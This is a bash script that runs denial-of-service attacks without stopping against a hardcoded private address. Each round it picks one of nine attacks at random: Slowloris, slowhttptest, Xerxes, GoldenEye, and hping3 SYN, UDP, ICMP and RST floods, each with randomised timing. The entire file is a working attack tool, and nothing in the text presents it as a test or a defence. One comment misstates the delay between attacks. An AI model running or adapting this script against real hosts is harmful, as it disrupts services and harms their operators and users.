#!/bin/bash

# Target IP
TARGET_IP="192.168.36.1"

# Function to run Slowloris DoS attack
run_slowloris() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running Slowloris attack on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT slowloris $TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run Hping3 (TCP SYN flood)
run_hping3() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running Hping3 (SYN flood) on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 --flood -S $TARGET_IP -p 80 &
    sleep $((RANDOM % 6 + 5))
}

# Function to run SYN flood attack using Hping3
run_synflood() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running SYN Flood on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 -i u40 -S -p 80 -c 100000 $TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run Slowhttptest (Slow HTTP DoS)
run_slowhttptest() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running Slowhttptest attack on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT slowhttptest -c 100 -i 10 -r 200 -t GET -p 80 -u http://$TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run UDP flood attack using Hping3
run_udpflood() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running UDP flood on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 --flood --udp $TARGET_IP -p 53 &
    sleep $((RANDOM % 6 + 5))
}

# Function to run Xerxes (HTTP DoS attack)
run_xerxes() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running Xerxes DoS attack on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT ./xerxes $TARGET_IP 80 &
    sleep $((RANDOM % 6 + 5))
}

# Function to run GoldenEye (HTTP DoS attack)
run_goldeneye() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running GoldenEye DoS attack on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT python3 goldeneye.py http://$TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run ICMP Flood attack
run_icmp_flood() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running ICMP Flood on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 --flood --icmp $TARGET_IP &
    sleep $((RANDOM % 6 + 5))
}

# Function to run TCP RST Flood attack
run_rst_flood() {
    TIMEOUT=$((RANDOM % 41 + 20))  # Random timeout between 20 and 60 seconds
    echo "Running TCP RST Flood on $TARGET_IP with timeout of $TIMEOUT seconds..."
    timeout $TIMEOUT hping3 -R --flood $TARGET_IP -p 80 &
    sleep $((RANDOM % 6 + 5))
}

# Main function to run DoS/DDoS attacks at random intervals
main() {
    echo "Running DoS/DDoS attacks on $TARGET_IP..."

    # Array of attack functions (excluding leak-prone attacks)
    ATTACKS=(
        "run_slowloris" "run_hping3" "run_synflood" "run_slowhttptest"
        "run_udpflood" "run_xerxes" "run_goldeneye" "run_icmp_flood" 
        "run_rst_flood"
    )

    while true; do
        # Select a random attack
        ATTACK=${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}

        # Execute the selected attack
        $ATTACK

        # Random delay between 60 and 120 seconds
        RANDOM_DELAY=$((RANDOM % 21 + 20))
        echo "Waiting for $RANDOM_DELAY seconds before running another attack..."
        sleep $RANDOM_DELAY
    done
}

# Run the main function
main
